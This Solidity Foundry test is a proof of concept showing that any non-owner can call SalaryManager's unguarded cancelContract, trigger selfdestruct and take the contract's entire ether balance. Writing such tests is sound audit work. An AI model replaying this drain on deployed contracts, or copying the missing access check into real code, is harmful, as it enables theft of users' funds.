
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SalaryManager} from "../src/SalaryManager.sol";

contract TestAccessControlSalaryManager is Test {
    SalaryManager public _contractUnderTest;
    address private _owner;

    function setUp() public {
        _owner = address(this);
        _contractUnderTest = new SalaryManager();
        
        // Fund the contract to ensure it has some balance
        vm.deal(address(_contractUnderTest), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself (which is the owner)
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));
        // Exclude Foundry Internals
        vm.assume(caller != address(vm));
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the owner - the only privileged role that should be able to call critical functions
        vm.assume(caller != _owner);

        // --- 2. State Configuration ---
        // Fund the caller so they can receive the selfdestruct funds
        vm.deal(caller, 1 ether);
        
        // Record the contract balance before the attack
        uint256 contractBalanceBefore = address(_contractUnderTest).balance;
        uint256 callerBalanceBefore = caller.balance;

        // --- 3. Execution & Assertion ---
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // The cancelContract function lacks access control (no onlyOwner modifier)
        // This allows any arbitrary user to call it and trigger selfdestruct
        _contractUnderTest.cancelContract();

        // Assert that the caller received the contract's funds via selfdestruct
        // This proves the vulnerability was successfully exploited
        assertEq(caller.balance, callerBalanceBefore + contractBalanceBefore);
    }
}
